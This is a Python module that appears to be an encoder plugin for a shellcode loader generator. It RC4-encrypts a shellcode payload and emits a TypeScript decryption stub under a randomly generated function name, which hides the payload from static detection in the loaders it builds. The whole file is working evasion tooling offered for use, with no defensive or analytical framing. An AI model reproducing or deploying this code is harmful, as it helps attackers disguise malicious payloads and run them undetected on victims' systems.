import os
from Crypto.Cipher import ARC4
from ts.utils.formatters import bytes_to_ts
import string
import random

class RC4Encrypt:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(16)

    def imports(self) -> list[str]:
        return ['import { createDecipheriv } from "node:crypto";']

    def compilerOptions(self) -> list[str]:
        return []

    def encode(self, plaintext: bytes) -> bytes:
        self.shellcodeSize = len(plaintext)
        cipher = ARC4.new(self.key)
        return cipher.encrypt(plaintext)

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name}(encrypted: Uint8Array): Uint8Array {{
    {bytes_to_ts(self.key, 'key')}
    const decipher = createDecipheriv('rc4', key, null);
    const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
    const output = new Uint8Array(decrypted);
    return output;
}}
"""
